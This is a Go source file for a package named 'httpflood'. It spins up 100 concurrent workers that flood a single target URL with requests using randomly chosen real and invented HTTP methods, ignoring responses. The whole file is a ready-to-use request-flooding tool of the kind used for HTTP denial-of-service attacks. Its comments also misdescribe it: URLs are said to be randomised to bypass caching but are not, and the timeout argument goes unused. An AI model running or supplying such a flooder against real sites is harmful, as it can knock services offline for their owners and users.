package httpflood

import (
	"bytes"
	"fmt"
	"math/rand"
	"net/http"
	"net/url"
	"sync"
	"time"
)

var waitGroup sync.WaitGroup
var data chan string

func fetchURL(count int) {
	fmt.Printf("URL fetcher #%d has started ...\n", count)
	defer func() {
		fmt.Printf("URL fetcher #%d closing down ...\n", count)
		waitGroup.Done()
	}()
	for {
		url, ok := <-data
		var method string
		var req *http.Request
		var err error

		if !ok {
			fmt.Println("The channel is closed!")
			break
		}

		client := &http.Client{}

		// Random method: mix things up a bit!
		switch rand.Intn(7) {
		case 0:
			method = "HEAD"
			req, err = http.NewRequest(method, url, nil)
		case 1:
			method = "POST"
			randomJson := []byte(`{"why":"I do not know.."}`)
			req, err = http.NewRequest(method, url, bytes.NewBuffer(randomJson))
		case 2:
			method = "PUT"
			randomJson := []byte(`{"why":"Ooh! Ooh! I know!"}`)
			req, err = http.NewRequest(method, url, bytes.NewBuffer(randomJson))
		case 3:
			method = "PATCH"
			randomJson := []byte(`{"why":"Ah damn, I lost it again."}`)
			req, err = http.NewRequest(method, url, bytes.NewBuffer(randomJson))
		case 4:
			method = "HELP"
			randomJson := []byte(`{"why":"Really. I lost it. Send help. Kthxbye."}`)
			req, err = http.NewRequest(method, url, bytes.NewBuffer(randomJson))
		case 5:
			method = "MATTIAS"
			randomJson := []byte(`{"why":"Now I remember. The METHOD can be _anything_."}`)
			req, err = http.NewRequest(method, url, bytes.NewBuffer(randomJson))
		default:
			method = "GET"
			req, err = http.NewRequest(method, url, nil)
		}

		if err != nil {
			fmt.Println(err)
		}

		client.Do(req)

		// Don't care about exit codes, just get that HTTP call out the door
		fmt.Printf("#%d: fetched %s \n", count, url)
	}
}

func FloodUrl(target string, timeout time.Duration, workersN int64) error {
	rand.Seed(time.Now().Unix())

	_, err := url.ParseRequestURI(target)
	if err != nil {
		return err
	}

	// Loop with some random parameters
	data = make(chan string)

	// Start X amount of concurrent fetchers
	for i := 1; i < 100+1; i++ {
		waitGroup.Add(1)
		go fetchURL(i)
	}

	// No fetch X amount of URLs using those fetchers
	for i := int64(0); i < workersN; i++ {
		// Randomise the URL a bit, bypass caching
		data <- (target)
	}

	return nil
}
